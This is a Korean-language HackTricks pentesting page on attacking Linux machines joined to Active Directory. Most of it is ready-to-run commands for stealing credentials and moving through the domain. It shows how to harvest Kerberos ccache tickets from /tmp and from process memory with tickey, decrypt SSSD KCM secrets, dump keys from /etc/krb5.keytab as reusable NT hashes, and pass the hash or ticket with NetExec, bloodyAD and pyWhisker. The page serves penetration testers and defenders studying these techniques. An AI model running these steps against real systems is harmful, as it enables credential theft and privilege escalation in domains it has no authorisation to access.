# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux 머신도 Active Directory 환경에 포함될 수 있습니다.

AD 내부의 Linux 머신은 **Kerberos material을 로컬에 저장**할 수 있습니다. 여기에는 user ccache, machine/service keytab, SSSD가 관리하는 secret이 포함됩니다. 이러한 아티팩트는 일반적인 다른 Kerberos credential과 마찬가지로 재사용할 수 있습니다. 대부분을 읽으려면 해당 ticket의 user owner이거나 머신의 **root**여야 합니다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### Linux에서 AD Enumeration

Linux에서 AD에 액세스할 수 있다면(또는 Windows에서 bash를 사용할 수 있다면) [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)을 사용해 AD를 열거할 수 있습니다.

다음 페이지에서 **Linux에서 AD를 열거하는 다른 방법**도 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA는 주로 **Unix** 환경을 위한 Microsoft Windows **Active Directory**의 오픈 소스 **대안**입니다. 완전한 **LDAP directory**와 MIT **Kerberos** Key Distribution Center를 결합하여 Active Directory와 유사한 관리를 제공합니다. CA 및 RA certificate 관리를 위해 Dogtag **Certificate System**을 사용하며, smartcard를 포함한 **multi-factor** authentication을 지원합니다. SSSD는 Unix authentication processes를 위해 통합되어 있습니다.<sup>[[14]](#references)[[15]](#references)</sup> 다음에서 자세히 알아볼 수 있습니다:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined 호스트 아티팩트

ticket을 다루기 전에 **호스트가 AD에 어떤 방식으로 joined되었는지**와 **Kerberos material이 실제로 어디에 저장되는지**를 확인해야 합니다. 최신 Linux 호스트에서는 일반적으로 단순히 `/tmp`의 flat file만 사용하는 것이 아니라 `realmd` + `adcli` + `sssd`가 이를 처리합니다.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
이렇게 하면 해당 host가 AD를 trust하는지, SSSD가 identity 또는 ticket을 caching하고 있는지, 그리고 **machine/service keytabs** 또는 **KCM secrets**을 악용할 수 있는지 빠르게 확인할 수 있습니다.<sup>[[4]](#references)[[10]](#references)</sup>

## Playing with tickets

### Pass The Ticket

이 페이지에서는 **Linux host 내부에서 Kerberos ticket을 찾을 수 있는** 다양한 위치를 확인할 수 있습니다. 다음 페이지에서는 이러한 CCache ticket 형식을 Kirbi(Windows에서 사용해야 하는 형식)로 변환하는 방법과 PTT attack을 수행하는 방법을 배울 수 있습니다:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows**(`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` 등)을 확인하려면 전용 페이지를 참고하세요:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files는 **Kerberos credentials를 저장하기 위한** binary format입니다. `FILE:/tmp/krb5cc_%{uid}`가 여전히 일반적이지만, modern Linux deployments에서는 `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` 또는 `KCM:%{uid}`도 사용합니다. ticket이 `/tmp`에 있다고 가정하기 전에 **`KRB5CCNAME`** environment variable과 `default_ccache_name` setting을 확인하세요.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE keyring ticket reuse

**프로세스의 메모리에 저장된 Kerberos tickets는 추출할 수 있으며**, 특히 시스템의 ptrace protection이 비활성화된 경우(` /proc/sys/kernel/yama/ptrace_scope`) 더욱 그렇습니다. 이를 위한 유용한 tool은 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)에서 확인할 수 있으며, sessions에 injection하고 tickets를 `/tmp`에 dump하여 추출을 용이하게 합니다.<sup>[[1]](#references)[[16]](#references)</sup>

이 tool을 configure하고 사용하는 단계는 다음과 같습니다:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
이 절차는 다양한 세션에 inject를 시도하며, 추출된 티켓을 `/tmp`에 `__krb_UID.ccache` 명명 규칙으로 저장하여 성공 여부를 표시합니다.<sup>[[1]](#references)</sup>

### SSSD KCM에서 CCACHE 티켓 재사용

SSSD는 `/var/lib/sss/secrets/secrets.ldb` 경로에 데이터베이스 사본을 유지합니다. 해당 키는 `/var/lib/sss/secrets/.secrets.mkey` 경로에 숨김 파일로 저장됩니다. 기본적으로 이 키는 **root** 권한이 있어야만 읽을 수 있습니다.<sup>[[4]](#references)</sup>

**`SSSDKCMExtractor`**를 --database 및 --key 파라미터와 함께 호출하면 데이터베이스를 파싱하고 **시크릿을 복호화**합니다.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Extractor는 raw Kerberos JSON payload를 출력하므로, pass-the-cache/pass-the-ticket 작업 전에 이를 사용 가능한 ticket cache 또는 다른 ticket 형식으로 변환해야 합니다.<sup>[[4]](#references)</sup>

### 빠른 keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab에서 계정 추출

root 권한으로 작동하는 services에 필수적인 service account key는 **`/etc/krb5.keytab`** 파일에 안전하게 저장됩니다. services의 password와 유사한 이러한 key는 엄격하게 기밀로 유지해야 합니다.<sup>[[5]](#references)</sup>

keytab 파일의 내용을 확인하려면 **`klist`**를 사용할 수 있습니다. Linux에서 `klist -k -K -e`는 principal, key version number, encryption type 및 raw key material을 출력합니다. key type이 **23 / RC4-HMAC**인 경우 key value는 해당 principal의 **NT hash**이기도 합니다.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux 사용자의 경우, **`KeyTabExtract`**는 RC4 HMAC hash를 추출하는 기능을 제공하며, 이를 NTLM hash reuse에 활용할 수 있습니다. 단, keytab에 **etype 23 / RC4-HMAC** material이 여전히 포함되어 있을 때만 유용합니다. **AES-only** 환경에서는 재사용 가능한 NT hash를 얻지 못할 수 있지만, Kerberos를 통해 keytab으로 직접 authenticate할 수는 있습니다.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS에서 **`bifrost`**는 keytab 파일 분석 도구로 사용됩니다.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
추출한 계정 및 hash 정보를 활용하면 **`NetExec`**와 같은 도구를 사용하여 서버에 연결할 수 있습니다.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab`의 machine account 재사용

`realmd`/`adcli`/`sssd`에 join된 시스템에서 `/etc/krb5.keytab`에는 일반적으로 **computer account**와 하나 이상의 **host/service principals**가 포함되어 있습니다. **root** 권한이 있다면 단순히 이를 dump하지 말고, `klist -k`로 나열된 principal 중 하나를 사용해 TGT를 요청하고 Linux host 자체로 동작하세요.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
이는 **computer object** 자체가 AD에서 delegated rights를 보유하거나, 해당 호스트가 **gMSA**와 같은 다른 secrets를 retrieve할 수 있도록 허용된 경우 특히 유용합니다.<sup>[[13]](#references)</sup>

### Linux-first AD tooling으로 탈취한 Kerberos material 재사용

유효한 `ccache` 또는 사용할 수 있는 keytab을 확보하면, 모든 것을 먼저 Windows formats로 변환하지 않고도 **Linux에서 직접** AD를 대상으로 작업할 수 있습니다. 많은 최신 도구는 `KRB5CCNAME` / Kerberos auth를 기본적으로 지원합니다.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
이는 **Linux post-exploitation**과 **AD object abuse**를 연결하는 좋은 방법입니다. 객체 수준의 abuse 경로 자체는 다음을 확인하세요.

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account 아티팩트

최근 Linux 배포 환경에서는 AD에서 **Managed Service Account**를 직접 사용할 수 있습니다. 실제로 이는 Linux 서버를 compromise한 후 호스트 keytab뿐만 아니라 gMSA에서 생성된 **service-specific keytab**도 발견할 수 있음을 의미합니다. 일반적으로 확인할 위치는 `/etc/gmsad.conf`, 배포 환경별 config 파일, 그리고 `/etc` 아래의 추가 `*.keytab` 파일입니다.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
이를 통해 **어떤 Windows endpoint도 건드리지 않고** 해당 gMSA에 연결된 SPN에 사용할 수 있는 재사용 가능한 Kerberos identity를 얻을 수 있습니다.<sup>[[13]](#references)</sup> AD에서 더 높은 권한을 획득한 후 **domain-side** gMSA/dMSA abuse를 수행하려면 다음을 확인하세요.

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos를 공격하는 방법은?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [managed service account로 AD에 액세스하기 – RHEL 시스템을 Active Directory와 직접 통합](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos environment variables – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Microsoft Windows에서 사용되는 RC4-HMAC Kerberos Encryption Types](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos 사용하기 | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identity Domains 검색 및 가입 | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [About | FreeIPA documentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 release notes](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – The Linux Kernel documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
